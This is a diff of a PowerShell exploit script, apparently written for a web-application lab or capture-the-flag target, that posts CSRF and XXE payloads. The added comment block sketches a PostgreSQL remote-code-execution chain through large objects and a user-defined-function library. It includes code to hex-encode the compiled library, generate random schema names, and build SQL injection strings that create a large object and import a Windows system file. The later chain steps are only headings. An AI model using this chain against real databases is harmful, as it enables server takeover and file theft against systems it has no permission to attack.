@@ -143,7 +143,28 @@ Invoke-WebRequest -Uri "http://answers/question" -Method POST -body "title=hax&d
 Write-Output "Sleeping for 30 seconds, start simulation"
 Start-Sleep -Seconds 30
 
+
 Remove-Item -Path $csrf_payload.Name
 Remove-Item -Path $xxe_payload.Name
+#$job = Start-Job -ScriptBlock {python3 simple-cors-http-server.py 80}
+# sleep for 5 seconds then we should have the output of the job
 
-# https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-command-execution
+<#
+RCE VIA LARGE OBJECT
+https://infosecwriteups.com/compiling-postgres-library-for-exploiting-udf-to-rce-d8cfd197bdf9
+1. follow instructions above to create the postgres.so
+2. convert to hex then b64
+$postgres_so_hex_bytes = (gc ./wrapper.dtd | Format-Hex -Encoding utf8).hexbytes
+$postgres_so_hex_string = (($postgres_so_hex_bytes | % {$_.tostring() }) -join ' ')  -replace '^','0x' -replace ' ', '0x'
+3. write to database via csrf
+3a. create_schema
+$schema_name = (-join (( 0x41..0x5A) + ( 0x61..0x7A) | Get-Random -Count 5 | % {[char]$_}))
+$table_name = (-join (( 0x41..0x5A) + ( 0x61..0x7A) | Get-Random -Count 5 | % {[char]$_}))
+$create_schema_sqli = "CREATE SCHEMA $schema_name;CREATE TABLE $schema_name.$table_name(loid oid);INSERT INTO $schema_name.$table_name(loid) VALUES ((SELECT lo_creat(-1)))"
+3b. create_lo
+$create_lo_sqli = "SELECT lo_import($$C:\\windows\\win.ini$$,{LOID()})";
+3c. inject_udf
+3d. export_udf
+3e. create_udf_func
+3f. trigger_udf
+#>
